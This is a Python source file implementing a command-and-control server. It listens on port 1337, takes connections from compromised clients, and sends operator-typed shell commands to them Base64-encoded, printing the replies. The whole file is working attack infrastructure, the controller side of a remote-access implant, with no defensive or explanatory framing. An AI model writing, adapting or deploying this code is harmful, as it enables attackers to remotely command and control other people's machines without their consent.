import socket
import threading
import json
import base64

class C2Server:
    def __init__(self, host='0.0.0.0', port=1337):
        self.host = host
        self.port = port
        self.clients = []
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] C2 Infrastructure Core listening on {self.host}:{self.port}")

    def handle_client(self, client_socket, address):
        print(f"[+] Connection established from {address}")
        self.clients.append(client_socket)
        while True:
            try:
                cmd = input("C2> ")
                if cmd.lower() == 'exit':
                    break
                # Basic encryption/encoding layer (Base64 for demonstration)
                encoded_cmd = base64.b64encode(cmd.encode()).decode()
                client_socket.send(encoded_cmd.encode())
                response = client_socket.recv(4096).decode()
                decoded_resp = base64.b64decode(response).decode()
                print(decoded_resp)
            except Exception as e:
                print(f"[-] Connection lost: {e}")
                self.clients.remove(client_socket)
                client_socket.close()
                break

    def run(self):
        while True:
            client, addr = self.server.accept()
            client_handler = threading.Thread(target=self.handle_client, args=(client, addr))
            client_handler.start()

if __name__ == "__main__":
    c2 = C2Server()
    c2.run()
